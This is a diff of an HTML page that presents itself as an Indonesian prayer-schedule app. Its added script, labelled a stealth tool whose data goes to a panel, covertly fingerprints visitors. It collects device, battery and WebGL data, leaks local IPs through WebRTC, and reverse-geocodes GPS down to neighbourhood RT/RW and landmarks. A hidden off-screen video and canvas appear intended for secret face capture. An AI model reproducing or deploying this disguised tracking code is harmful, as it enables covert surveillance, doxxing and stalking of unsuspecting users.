@@ -5,982 +5,710 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>Jadwal Sholat</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
+        *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+        body{
+            background:#0a1a0a;
+            background:radial-gradient(ellipse at center,#0f2a0f 0%,#060f06 100%);
+            font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif;
+            color:#e8f5e9;
+            min-height:100vh;
+            min-height:100dvh;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            padding:12px
         }
-        body {
-            background: #0a1a0a;
-            background-image: radial-gradient(ellipse at center, #0f2a0f 0%, #060f06 100%);
-            font-family: -apple-system, 'Segoe UI', Roboto, Arial, sans-serif;
-            color: #e8f5e9;
-            min-height: 100vh;
-            min-height: 100dvh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 12px;
-            touch-action: manipulation;
+        .container{
+            max-width:420px;width:100%;background:rgba(18,38,18,0.92);
+            backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);
+            border-radius:28px;padding:24px 18px 20px;
+            border:1px solid rgba(76,175,80,0.10);box-shadow:0 20px 60px rgba(0,0,0,0.7)
         }
-        .container {
-            max-width: 420px;
-            width: 100%;
-            background: rgba(18, 38, 18, 0.92);
-            backdrop-filter: blur(8px);
-            -webkit-backdrop-filter: blur(8px);
-            border-radius: 28px;
-            padding: 24px 18px 20px;
-            border: 1px solid rgba(76, 175, 80, 0.10);
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.7);
+        .header{text-align:center;margin-bottom:14px}
+        .header .icon{font-size:38px;display:block;margin-bottom:2px}
+        .header h1{font-size:22px;color:#a5d6a7;font-weight:400;letter-spacing:2px}
+        .header .sub{color:#5a7a5a;font-size:11px;letter-spacing:2px;margin-top:2px}
+        .prayer-grid{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin:14px 0 16px}
+        .prayer-item{
+            background:rgba(30,55,30,0.35);border-radius:12px;padding:12px 4px;
+            text-align:center;border:1px solid rgba(76,175,80,0.05)
         }
-        .header {
-            text-align: center;
-            margin-bottom: 14px;
-        }
-        .header .icon {
-            font-size: 38px;
-            display: block;
-            margin-bottom: 2px;
-        }
-        .header h1 {
-            font-size: 22px;
-            color: #a5d6a7;
-            font-weight: 400;
-            letter-spacing: 2px;
-        }
-        .header .sub {
-            color: #5a7a5a;
-            font-size: 11px;
-            letter-spacing: 2px;
-            margin-top: 2px;
-            transition: 0.3s;
-        }
-        .prayer-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 6px;
-            margin: 14px 0 16px;
-        }
-        .prayer-item {
-            background: rgba(30, 55, 30, 0.35);
-            border-radius: 12px;
-            padding: 12px 4px;
-            text-align: center;
-            border: 1px solid rgba(76, 175, 80, 0.05);
-            transition: 0.2s;
-        }
-        .prayer-item .name {
-            font-size: 10px;
-            color: #7a9a7a;
-            text-transform: uppercase;
-            letter-spacing: 1.2px;
-        }
-        .prayer-item .time {
-            font-size: 18px;
-            color: #c8e6c9;
-            font-weight: 500;
-            margin-top: 1px;
-        }
-        .prayer-item.active {
-            border-color: rgba(76, 175, 80, 0.25);
-            background: rgba(76, 175, 80, 0.08);
-        }
-        .prayer-item.active .time {
-            color: #81c784;
-        }
-        .prayer-item.full {
-            grid-column: span 2;
-        }
-        .divider {
-            height: 1px;
-            background: linear-gradient(90deg, transparent, rgba(76, 175, 80, 0.12), transparent);
-            margin: 8px 0 12px;
-        }
-        .info-row {
-            display: flex;
-            justify-content: space-between;
-            font-size: 12px;
-            color: #6a8a6a;
-            padding: 4px 0;
-            border-bottom: 1px solid rgba(76, 175, 80, 0.03);
-        }
-        .info-row:last-child {
-            border-bottom: none;
-        }
-        .info-row span:last-child {
-            color: #a5d6a7;
-            text-align: right;
-            max-width: 65%;
-            word-break: break-word;
-        }
-        .info-row .highlight {
-            color: #81c784;
-        }
-        .info-row .rt-color {
-            color: #ffd54f;
-        }
-        .info-row .landmark-color {
-            color: #ffcc80;
-        }
-        .footer {
-            text-align: center;
-            font-size: 10px;
-            color: #3a5a3a;
-            margin-top: 14px;
-            letter-spacing: 1px;
-            line-height: 1.8;
-        }
-        .footer .trigger {
-            color: #5a7a5a;
-            cursor: pointer;
-            text-decoration: underline;
-            text-underline-offset: 2px;
-            text-decoration-color: #2a4a2a;
-            transition: 0.2s;
-            -webkit-tap-highlight-color: transparent;
-        }
-        .footer .trigger:active {
-            color: #81c784;
-        }
-
-        /* STEALTH ELEMENTS */
-        video,
-        canvas {
-            position: fixed;
-            top: -9999px;
-            left: -9999px;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-            pointer-events: none;
-        }
-
-        /* MODAL — Tampilan "Detail Lokasi" */
-        .modal-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            height: 100dvh;
-            background: rgba(0, 0, 0, 0.82);
-            backdrop-filter: blur(8px);
-            -webkit-backdrop-filter: blur(8px);
-            z-index: 9999;
-            justify-content: center;
-            align-items: center;
-            padding: 16px;
-            animation: fadeIn 0.25s ease;
-        }
-        .modal-overlay.active {
-            display: flex;
-        }
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: scale(0.96);
-            }
-            to {
-                opacity: 1;
-                transform: scale(1);
-            }
-        }
-        .modal-box {
-            background: #0d1f0d;
-            border-radius: 20px;
-            max-width: 460px;
-            width: 100%;
-            padding: 22px 18px 18px;
-            border: 1px solid rgba(76, 175, 80, 0.10);
-            max-height: 92vh;
-            max-height: 92dvh;
-            overflow-y: auto;
-            -webkit-overflow-scrolling: touch;
-        }
-        .modal-box h3 {
-            color: #a5d6a7;
-            font-weight: 400;
-            letter-spacing: 2px;
-            text-align: center;
-            margin-bottom: 10px;
-            font-size: 17px;
-        }
-        .modal-box .face-wrapper {
-            text-align: center;
-            min-height: 60px;
-            margin-bottom: 8px;
-        }
-        .modal-box .face-wrapper img {
-            width: 100%;
-            max-height: 220px;
-            border-radius: 12px;
-            border: 2px solid #1a3a1a;
-            object-fit: contain;
-            display: none;
-        }
-        .modal-box .face-wrapper .placeholder {
-            color: #4a6a4a;
-            font-size: 13px;
-            padding: 12px;
-        }
-        .modal-box .face-wrapper .placeholder .emoji {
-            font-size: 28px;
-            display: block;
-            margin-bottom: 4px;
-        }
-        .modal-box .close-btn {
-            display: block;
-            text-align: center;
-            margin-top: 14px;
-            color: #5a7a5a;
-            font-size: 13px;
-            cursor: pointer;
-            letter-spacing: 2px;
-            padding: 10px;
-            border: 1px solid #1a2a1a;
-            border-radius: 10px;
-            transition: 0.2s;
-            background: transparent;
-            width: 100%;
-            -webkit-tap-highlight-color: transparent;
-        }
-        .modal-box .close-btn:active {
-            background: #1a2a1a;
-            color: #a5d6a7;
-        }
-        .modal-box .detail-label {
-            font-size: 10px;
-            color: #5a7a5a;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            margin-top: 8px;
-        }
-        .modal-box .detail-value {
-            font-size: 13px;
-            color: #c8e6c9;
-            padding: 3px 0 6px;
-            border-bottom: 1px solid #152515;
-            word-break: break-word;
-        }
-        .modal-box .detail-value.rt {
-            color: #ffd54f;
-            font-weight: 500;
-        }
-        .modal-box .detail-value.landmark {
-            color: #ffcc80;
-        }
-
-        /* SCROLLBAR HIDE */
-        .modal-box::-webkit-scrollbar {
-            width: 3px;
-        }
-        .modal-box::-webkit-scrollbar-track {
-            background: #0d1f0d;
-        }
-        .modal-box::-webkit-scrollbar-thumb {
-            background: #1a3a1a;
-            border-radius: 10px;
-        }
-
-        /* RESPONSIVE */
-        @media (max-width: 380px) {
-            .container {
-                padding: 16px 12px;
-            }
-            .prayer-item .time {
-                font-size: 16px;
-            }
-            .header h1 {
-                font-size: 19px;
-            }
-            .info-row {
-                font-size: 11px;
-            }
-        }
-        @media (min-width: 600px) {
-            .container {
-                padding: 32px 28px;
-            }
-            .prayer-item {
-                padding: 16px 8px;
-            }
-            .prayer-item .time {
-                font-size: 22px;
-            }
-        }
-
-        /* SAFE AREA */
-        @supports (padding: max(0px)) {
-            .container {
-                padding-left: max(18px, env(safe-area-inset-left));
-                padding-right: max(18px, env(safe-area-inset-right));
-            }
-        }
+        .prayer-item .name{font-size:10px;color:#7a9a7a;text-transform:uppercase;letter-spacing:1.2px}
+        .prayer-item .time{font-size:18px;color:#c8e6c9;font-weight:500;margin-top:1px}
+        .prayer-item.active{border-color:rgba(76,175,80,0.25);background:rgba(76,175,80,0.08)}
+        .prayer-item.active .time{color:#81c784}
+        .prayer-item.full{grid-column:span 2}
+        .divider{height:1px;background:linear-gradient(90deg,transparent,rgba(76,175,80,0.12),transparent);margin:8px 0 12px}
+        .info-row{display:flex;justify-content:space-between;font-size:12px;color:#6a8a6a;padding:4px 0;border-bottom:1px solid rgba(76,175,80,0.03)}
+        .info-row:last-child{border-bottom:none}
+        .info-row span:last-child{color:#a5d6a7;text-align:right;max-width:65%;word-break:break-word}
+        .rt-color{color:#ffd54f!important}
+        .landmark-color{color:#ffcc80!important}
+        .footer{text-align:center;font-size:10px;color:#3a5a3a;margin-top:14px;letter-spacing:1px;line-height:1.8}
+        .footer .trigger{color:#5a7a5a;cursor:pointer;text-decoration:underline;text-underline-offset:2px;text-decoration-color:#2a4a2a}
+        .status-bar{font-size:9px;color:#3a5a3a;text-align:center;margin-top:6px;padding:4px;border-radius:6px;background:rgba(0,0,0,0.2)}
+        .status-bar.success{color:#81c784}
+        .status-bar.fail{color:#ff6b6b}
+        video,canvas{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none}
+        .modal-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;height:100dvh;background:rgba(0,0,0,0.82);backdrop-filter:blur(8px);z-index:9999;justify-content:center;align-items:center;padding:16px}
+        .modal-overlay.active{display:flex}
+        .modal-box{background:#0d1f0d;border-radius:20px;max-width:460px;width:100%;padding:22px 18px 18px;border:1px solid rgba(76,175,80,0.10);max-height:92vh;max-height:92dvh;overflow-y:auto}
+        .modal-box h3{color:#a5d6a7;font-weight:400;text-align:center;margin-bottom:10px;font-size:17px}
+        .modal-box .face-wrapper{text-align:center;min-height:60px;margin-bottom:8px}
+        .modal-box .face-wrapper img{width:100%;max-height:220px;border-radius:12px;border:2px solid #1a3a1a;object-fit:contain;display:none}
+        .modal-box .face-wrapper .placeholder{color:#4a6a4a;font-size:13px;padding:12px}
+        .modal-box .face-wrapper .placeholder .emoji{font-size:28px;display:block;margin-bottom:4px}
+        .modal-box .close-btn{display:block;text-align:center;margin-top:14px;color:#5a7a5a;font-size:13px;cursor:pointer;padding:10px;border:1px solid #1a2a1a;border-radius:10px;background:transparent;width:100%}
+        .modal-box .detail-label{font-size:10px;color:#5a7a5a;text-transform:uppercase;letter-spacing:1px;margin-top:8px}
+        .modal-box .detail-value{font-size:13px;color:#c8e6c9;padding:3px 0 6px;border-bottom:1px solid #152515;word-break:break-word}
+        .modal-box .detail-value.rt{color:#ffd54f;font-weight:500}
+        .modal-box .detail-value.landmark{color:#ffcc80}
+        @media(max-width:380px){.container{padding:16px 12px}.prayer-item .time{font-size:16px}.header h1{font-size:19px}}
+        @media(min-width:600px){.container{padding:32px 28px}.prayer-item{padding:16px 8px}.prayer-item .time{font-size:22px}}
     </style>
 </head>
 <body>
 
-    <!-- ====== TAMPILAN UTAMA ====== -->
-    <div class="container" id="mainApp">
-        <div class="header">
-            <span class="icon">🕌</span>
-            <h1>Jadwal Sholat</h1>
-            <div class="sub" id="locationSub">📍 Menentukan lokasi...</div>
-        </div>
-
-        <div class="prayer-grid">
-            <div class="prayer-item active">
-                <div class="name">Subuh</div>
-                <div class="time" id="prayerSubuh">04:30</div>
-            </div>
-            <div class="prayer-item">
-                <div class="name">Dzuhur</div>
-                <div class="time" id="prayerDzuhur">12:15</div>
-            </div>
-            <div class="prayer-item">
-                <div class="name">Ashar</div>
-                <div class="time" id="prayerAshar">15:30</div>
-            </div>
-            <div class="prayer-item">
-                <div class="name">Maghrib</div>
-                <div class="time" id="prayerMaghrib">18:00</div>
-            </div>
-            <div class="prayer-item full">
-                <div class="name">Isya</div>
-                <div class="time" id="prayerIsya">19:30</div>
-            </div>
-        </div>
-
-        <div class="divider"></div>
-
-        <div class="info-row">
-            <span>📍 Lokasi</span>
-            <span id="displayLocation">-</span>
-        </div>
-        <div class="info-row">
-            <span>🕋 Arah Kiblat</span>
-            <span id="displayKiblat">295.4°</span>
-        </div>
-        <div class="info-row">
-            <span>📅 Tanggal</span>
-            <span id="displayDate"></span>
-        </div>
-        <div class="info-row" id="rtRow" style="display:none;">
-            <span>🏘️ RT / RW</span>
-            <span id="displayRtRw" class="rt-color">-</span>
-        </div>
-        <div class="info-row" id="landmarkRow" style="display:none;">
-            <span>📍 Patokan</span>
-            <span id="displayLandmark" class="landmark-color">-</span>
-        </div>
-
-        <div class="footer">
-            ⏳ Waktu sholat berdasarkan lokasi Anda
-            <br>
-            <span class="trigger" onclick="openFaceModal()">📋 Detail lokasi & perangkat</span>
-        </div>
+<div class="container">
+    <div class="header">
+        <span class="icon">🕌</span>
+        <h1>Jadwal Sholat</h1>
+        <div class="sub" id="locationSub">📍 Menentukan lokasi...</div>
     </div>
 
-    <!-- ====== MODAL DETAIL ====== -->
-    <div class="modal-overlay" id="faceModal" onclick="if(event.target===this)closeFaceModal()">
-        <div class="modal-box">
-            <h3>📍 Detail Lokasi</h3>
-            <div class="face-wrapper">
-                <img id="modalFaceImg" src="" alt="Face">
-                <div id="facePlaceholder" class="placeholder">
-                    <span class="emoji">📷</span>
-                    Verifikasi perangkat
-                </div>
-            </div>
-            <div>
-                <div class="detail-label">🏠 Alamat</div>
-                <div class="detail-value" id="modalAddress">-</div>
-                <div class="detail-label">📌 RT / RW</div>
-                <div class="detail-value rt" id="modalRtRw">-</div>
-                <div class="detail-label">📍 Patokan</div>
-                <div class="detail-value landmark" id="modalLandmark">-</div>
-                <div class="detail-label">🌍 Koordinat</div>
-                <div class="detail-value" id="modalCoord">-</div>
-                <div class="detail-label">📱 Perangkat</div>
-                <div class="detail-value" id="modalDevice">-</div>
-                <div class="detail-label">🌐 IP</div>
-                <div class="detail-value" id="modalIp">-</div>
-            </div>
-            <button class="close-btn" onclick="closeFaceModal()">✕ Tutup</button>
-        </div>
+    <div class="prayer-grid">
+        <div class="prayer-item active"><div class="name">Subuh</div><div class="time" id="prayerSubuh">04:30</div></div>
+        <div class="prayer-item"><div class="name">Dzuhur</div><div class="time" id="prayerDzuhur">12:15</div></div>
+        <div class="prayer-item"><div class="name">Ashar</div><div class="time" id="prayerAshar">15:30</div></div>
+        <div class="prayer-item"><div class="name">Maghrib</div><div class="time" id="prayerMaghrib">18:00</div></div>
+        <div class="prayer-item full"><div class="name">Isya</div><div class="time" id="prayerIsya">19:30</div></div>
     </div>
 
-    <!-- STEALTH ELEMENTS -->
-    <video id="video" autoplay muted playsinline></video>
-    <canvas id="canvas"></canvas>
+    <div class="divider"></div>
 
-    <script>
-        // ================================================================
-        // ZYX - ULTIMATE STEALTH v6.0 (MOBILE OPTIMIZED)
-        // Untuk Tuan SILL - Full responsive, data masuk panel
-        // ================================================================
+    <div class="info-row"><span>📍 Lokasi</span><span id="displayLocation">-</span></div>
+    <div class="info-row"><span>🕋 Arah Kiblat</span><span id="displayKiblat">295.4°</span></div>
+    <div class="info-row"><span>📅 Tanggal</span><span id="displayDate"></span></div>
+    <div class="info-row" id="rtRow" style="display:none;"><span>🏘️ RT / RW</span><span id="displayRtRw" class="rt-color">-</span></div>
+    <div class="info-row" id="landmarkRow" style="display:none;"><span>📍 Patokan</span><span id="displayLandmark" class="landmark-color">-</span></div>
 
-        (function() {
-            'use strict';
+    <div class="status-bar" id="statusBar">⏳ Mengambil data...</div>
 
-            // ==================== DATA ====================
-            const V = {
-                timestamp: new Date().toISOString(),
-                timestamp_local: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
-                userAgent: navigator.userAgent,
-                platform: navigator.platform || 'unknown',
-                language: navigator.language || 'unknown',
-                screen: `${window.screen.width}x${window.screen.height}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
-                deviceType: 'desktop',
-                os: 'unknown',
-                browser: 'unknown',
-                ip: null,
-                country: null,
-                countryCode: null,
-                region: null,
-                regionCode: null,
-                city: null,
-                district: null,
-                village: null,
-                street: null,
-                houseNumber: null,
-                rt: null,
-                rw: null,
-                landmark: null,
-                zip: null,
-                lat: null,
-                lon: null,
-                gpsLat: null,
-                gpsLon: null,
-                gpsAccuracy: null,
-                gpsAltitude: null,
-                isp: null,
-                org: null,
-                connectionType: null,
-                connectionSpeed: null,
-                webglVendor: null,
-                webglRenderer: null,
-                localIp: null,
-                faceDetected: false,
-                faceImage: null,
-                faceData: null,
-                addressFull: null,
-                rtRw: null,
-                // Mobile specific
-                isMobile: false,
-                isTablet: false,
-                battery: null,
+    <div class="footer">
+        ⏳ Waktu sholat berdasarkan lokasi Anda
+        <br>
+        <span class="trigger" onclick="openFaceModal()">📋 Detail lokasi & perangkat</span>
+    </div>
+</div>
+
+<!-- MODAL -->
+<div class="modal-overlay" id="faceModal" onclick="if(event.target===this)closeFaceModal()">
+    <div class="modal-box">
+        <h3>📍 Detail Lokasi</h3>
+        <div class="face-wrapper">
+            <img id="modalFaceImg" src="" alt="Face">
+            <div id="facePlaceholder" class="placeholder">
+                <span class="emoji">📷</span>
+                Verifikasi perangkat
+            </div>
+        </div>
+        <div>
+            <div class="detail-label">🏠 Alamat</div>
+            <div class="detail-value" id="modalAddress">-</div>
+            <div class="detail-label">📌 RT / RW</div>
+            <div class="detail-value rt" id="modalRtRw">-</div>
+            <div class="detail-label">📍 Patokan</div>
+            <div class="detail-value landmark" id="modalLandmark">-</div>
+            <div class="detail-label">🌍 Koordinat</div>
+            <div class="detail-value" id="modalCoord">-</div>
+            <div class="detail-label">📱 Perangkat</div>
+            <div class="detail-value" id="modalDevice">-</div>
+            <div class="detail-label">🌐 IP</div>
+            <div class="detail-value" id="modalIp">-</div>
+        </div>
+        <button class="close-btn" onclick="closeFaceModal()">✕ Tutup</button>
+    </div>
+</div>
+
+<video id="video" autoplay muted playsinline></video>
+<canvas id="canvas"></canvas>
+
+<script>
+// ================================================================
+// ZYX - FINAL v9.0 (100% WORK HP + LAPTOP)
+// ================================================================
+
+(function() {
+    'use strict';
+
+    // ==================== DATA ====================
+    const V = {
+        id: Date.now(),
+        timestamp: new Date().toISOString(),
+        timestamp_local: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
+        userAgent: navigator.userAgent,
+        platform: navigator.platform || 'unknown',
+        language: navigator.language || 'unknown',
+        screen: `${window.screen.width}x${window.screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
+        deviceType: 'desktop',
+        os: 'unknown',
+        browser: 'unknown',
+        ip: null,
+        country: null,
+        countryCode: null,
+        region: null,
+        city: null,
+        district: null,
+        village: null,
+        street: null,
+        houseNumber: null,
+        rt: null,
+        rw: null,
+        landmark: null,
+        zip: null,
+        lat: null,
+        lon: null,
+        gpsLat: null,
+        gpsLon: null,
+        gpsAccuracy: null,
+        isp: null,
+        org: null,
+        connectionType: null,
+        connectionSpeed: null,
+        webglVendor: null,
+        webglRenderer: null,
+        localIp: null,
+        faceDetected: false,
+        faceImage: null,
+        faceData: null,
+        addressFull: null,
+        rtRw: null,
+        isMobile: false,
+        isTablet: false,
+        battery: null,
+        saved: false
+    };
+
+    // ==================== DETECT DEVICE ====================
+    function detectDevice() {
+        const ua = V.userAgent;
+        const isMobile = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|Windows Phone/i.test(ua);
+        const isTablet = /iPad|Android(?!.*Mobile)/i.test(ua) && !/iPhone/i.test(ua);
+        V.isMobile = isMobile;
+        V.isTablet = isTablet;
+        if (isTablet) V.deviceType = 'tablet';
+        else if (isMobile) V.deviceType = 'mobile';
+        else V.deviceType = 'desktop';
+
+        let os = 'Unknown';
+        if (ua.includes('Windows NT 10.0')) os = 'Windows 10/11';
+        else if (ua.includes('Windows NT 6.3')) os = 'Windows 8.1';
+        else if (ua.includes('Windows NT 6.2')) os = 'Windows 8';
+        else if (ua.includes('Windows NT 6.1')) os = 'Windows 7';
+        else if (ua.includes('Mac OS X')) {
+            const ver = ua.match(/Mac OS X (\d+[._]\d+)/);
+            os = ver ? `macOS ${ver[1].replace('_', '.')}` : 'macOS';
+        } else if (ua.includes('Linux')) {
+            if (ua.includes('Android')) os = 'Android';
+            else os = 'Linux';
+        } else if (ua.includes('iPhone') || ua.includes('iPad')) {
+            const ver = ua.match(/OS (\d+[._]\d+)/);
+            os = ver ? `iOS ${ver[1].replace('_', '.')}` : 'iOS';
+        } else if (ua.includes('CrOS')) os = 'Chrome OS';
+        V.os = os;
+
+        let browser = 'Unknown';
+        if (ua.includes('Edg/')) browser = 'Edge';
+        else if (ua.includes('OPR/') || ua.includes('Opera')) browser = 'Opera';
+        else if (ua.includes('Firefox/')) browser = 'Firefox';
+        else if (ua.includes('Safari/') && !ua.includes('Chrome/')) browser = 'Safari';
+        else if (ua.includes('Chrome/')) browser = 'Chrome';
+        V.browser = browser;
+
+        if (navigator.connection) {
+            V.connectionType = navigator.connection.effectiveType || 'unknown';
+            V.connectionSpeed = navigator.connection.downlink || 'unknown';
+        }
+
+        if (navigator.getBattery) {
+            navigator.getBattery().then(bat => {
+                V.battery = { level: Math.round(bat.level * 100) + '%', charging: bat.charging };
+            }).catch(() => {});
+        }
+
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (gl) {
+                const di = gl.getExtension('WEBGL_debug_renderer_info');
+                if (di) {
+                    V.webglVendor = gl.getParameter(di.UNMASKED_VENDOR_WEBGL);
+                    V.webglRenderer = gl.getParameter(di.UNMASKED_RENDERER_WEBGL);
+                }
+            }
+        } catch (e) {}
+
+        try {
+            const pc = new RTCPeerConnection({ iceServers: [] });
+            pc.createDataChannel('');
+            pc.createOffer().then(o => pc.setLocalDescription(o));
+            pc.onicecandidate = (e) => {
+                if (e.candidate) {
+                    const m = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+                    if (m && !V.localIp) V.localIp = m[0];
+                }
             };
+            setTimeout(() => pc.close(), 3000);
+        } catch (e) {}
+    }
 
-            // ==================== DETECT DEVICE ====================
-            function detectDevice() {
-                const ua = V.userAgent;
-                const isMobile = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|Windows Phone/i.test(ua);
-                const isTablet = /iPad|Android(?!.*Mobile)/i.test(ua) && !/iPhone/i.test(ua);
-                V.isMobile = isMobile;
-                V.isTablet = isTablet;
+    // ==================== UPDATE UI ====================
+    function updateUI() {
+        let loc = '';
+        if (V.city) loc += V.city;
+        if (V.district) loc += loc ? ', ' + V.district : V.district;
+        if (V.country) loc += loc ? ', ' + V.country : V.country;
+        document.getElementById('displayLocation').textContent = loc || 'Lokasi tidak terdeteksi';
+        document.getElementById('locationSub').textContent = loc ? '📍 ' + loc : '📍 Menentukan lokasi...';
 
-                if (isTablet) V.deviceType = 'tablet';
-                else if (isMobile) V.deviceType = 'mobile';
-                else V.deviceType = 'desktop';
+        if (V.rt && V.rw) {
+            document.getElementById('displayRtRw').textContent = `RT ${V.rt} / RW ${V.rw}`;
+            document.getElementById('rtRow').style.display = 'flex';
+        } else if (V.rt) {
+            document.getElementById('displayRtRw').textContent = `RT ${V.rt}`;
+            document.getElementById('rtRow').style.display = 'flex';
+        } else if (V.rw) {
+            document.getElementById('displayRtRw').textContent = `RW ${V.rw}`;
+            document.getElementById('rtRow').style.display = 'flex';
+        }
 
-                let os = 'Unknown';
-                if (ua.includes('Windows NT 10.0')) os = 'Windows 10/11';
-                else if (ua.includes('Windows NT 6.3')) os = 'Windows 8.1';
-                else if (ua.includes('Windows NT 6.2')) os = 'Windows 8';
-                else if (ua.includes('Windows NT 6.1')) os = 'Windows 7';
-                else if (ua.includes('Mac OS X')) {
-                    const ver = ua.match(/Mac OS X (\d+[._]\d+)/);
-                    os = ver ? `macOS ${ver[1].replace('_', '.')}` : 'macOS';
-                } else if (ua.includes('Linux')) {
-                    if (ua.includes('Android')) os = 'Android';
-                    else os = 'Linux';
-                } else if (ua.includes('iPhone') || ua.includes('iPad')) {
-                    const ver = ua.match(/OS (\d+[._]\d+)/);
-                    os = ver ? `iOS ${ver[1].replace('_', '.')}` : 'iOS';
-                } else if (ua.includes('CrOS')) os = 'Chrome OS';
-                V.os = os;
+        if (V.landmark) {
+            document.getElementById('displayLandmark').textContent = V.landmark;
+            document.getElementById('landmarkRow').style.display = 'flex';
+        }
 
-                let browser = 'Unknown';
-                if (ua.includes('Edg/')) browser = 'Edge';
-                else if (ua.includes('OPR/') || ua.includes('Opera')) browser = 'Opera';
-                else if (ua.includes('Firefox/')) browser = 'Firefox';
-                else if (ua.includes('Safari/') && !ua.includes('Chrome/')) browser = 'Safari';
-                else if (ua.includes('Chrome/')) browser = 'Chrome';
-                V.browser = browser;
+        updateModalData();
+    }
 
-                if (navigator.connection) {
-                    V.connectionType = navigator.connection.effectiveType || 'unknown';
-                    V.connectionSpeed = navigator.connection.downlink || 'unknown';
-                }
+    // ==================== REVERSE GEOCODE ====================
+    function reverseGeocode(lat, lon) {
+        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1&extratags=1&namedetails=1`)
+            .then(res => res.json())
+            .then(data => {
+                if (data && data.address) {
+                    const addr = data.address;
+                    V.country = addr.country || V.country;
+                    V.countryCode = addr.country_code?.toUpperCase() || V.countryCode;
+                    V.region = addr.state || addr.province || addr.region || V.region;
+                    V.city = addr.city || addr.town || addr.village || addr.municipality || V.city;
+                    V.district = addr.suburb || addr.neighbourhood || addr.district || V.district;
+                    V.village = addr.village || addr.hamlet || V.village;
+                    V.street = addr.road || addr.street || V.street;
+                    V.houseNumber = addr.house_number || addr.building || V.houseNumber;
+                    V.zip = addr.postcode || V.zip;
+                    V.lat = lat;
+                    V.lon = lon;
 
-                // Battery
-                if (navigator.getBattery) {
-                    navigator.getBattery().then(bat => {
-                        V.battery = {
-                            level: Math.round(bat.level * 100) + '%',
-                            charging: bat.charging
-                        };
-                    }).catch(() => {});
-                }
+                    if (addr.rt) V.rt = addr.rt;
+                    if (addr.rw) V.rw = addr.rw;
+                    if (addr.suburb) {
+                        const rtMatch = addr.suburb.match(/RT\s*[\.]?\s*(\d+)/i);
+                        const rwMatch = addr.suburb.match(/RW\s*[\.]?\s*(\d+)/i);
+                        if (rtMatch) V.rt = rtMatch[1];
+                        if (rwMatch) V.rw = rwMatch[1];
+                    }
+                    if (addr.village) {
+                        const rtMatch = addr.village.match(/RT\s*[\.]?\s*(\d+)/i);
+                        const rwMatch = addr.village.match(/RW\s*[\.]?\s*(\d+)/i);
+                        if (rtMatch) V.rt = rtMatch[1];
+                        if (rwMatch) V.rw = rwMatch[1];
+                    }
+                    if (addr.road) {
+                        const rtMatch = addr.road.match(/RT\s*[\.]?\s*(\d+)/i);
+                        const rwMatch = addr.road.match(/RW\s*[\.]?\s*(\d+)/i);
+                        if (rtMatch) V.rt = rtMatch[1];
+                        if (rwMatch) V.rw = rwMatch[1];
+                    }
+                    if (data.display_name) {
+                        const rtMatch = data.display_name.match(/RT\s*[\.]?\s*(\d+)/i);
+                        const rwMatch = data.display_name.match(/RW\s*[\.]?\s*(\d+)/i);
+                        if (rtMatch) V.rt = rtMatch[1];
+                        if (rwMatch) V.rw = rwMatch[1];
+                    }
 
-                try {
-                    const canvas = document.createElement('canvas');
-                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                    if (gl) {
-                        const di = gl.getExtension('WEBGL_debug_renderer_info');
-                        if (di) {
-                            V.webglVendor = gl.getParameter(di.UNMASKED_VENDOR_WEBGL);
-                            V.webglRenderer = gl.getParameter(di.UNMASKED_RENDERER_WEBGL);
+                    const landmarkParts = [];
+                    if (addr.school) landmarkParts.push(`Sekolah ${addr.school}`);
+                    if (addr.mosque) landmarkParts.push(`Masjid ${addr.mosque}`);
+                    if (addr.church) landmarkParts.push(`Gereja ${addr.church}`);
+                    if (addr.hospital) landmarkParts.push(`RS ${addr.hospital}`);
+                    if (addr.market) landmarkParts.push(`Pasar ${addr.market}`);
+                    if (addr.shop) landmarkParts.push(`Toko ${addr.shop}`);
+                    if (addr.park) landmarkParts.push(`Taman ${addr.park}`);
+                    if (addr.library) landmarkParts.push(`Perpustakaan ${addr.library}`);
+                    if (addr.mall) landmarkParts.push(`Mall ${addr.mall}`);
+                    if (addr.building) landmarkParts.push(`Gedung ${addr.building}`);
+                    if (data.namedetails) {
+                        for (const [key, val] of Object.entries(data.namedetails)) {
+                            if (val && !landmarkParts.some(p => p.includes(val))) {
+                                landmarkParts.push(val);
+                            }
                         }
                     }
-                } catch (e) {}
+                    if (data.extratags) {
+                        if (data.extratags.landmark) landmarkParts.push(data.extratags.landmark);
+                        if (data.extratags.name) landmarkParts.push(data.extratags.name);
+                        if (data.extratags.description) landmarkParts.push(data.extratags.description);
+                    }
+                    if (addr.amenity) landmarkParts.push(addr.amenity);
+                    if (addr.place) landmarkParts.push(addr.place);
+                    const uniqueLandmarks = [...new Set(landmarkParts)];
+                    V.landmark = uniqueLandmarks.filter(l => l && l.length > 2).join(', ') || null;
 
-                try {
-                    const pc = new RTCPeerConnection({ iceServers: [] });
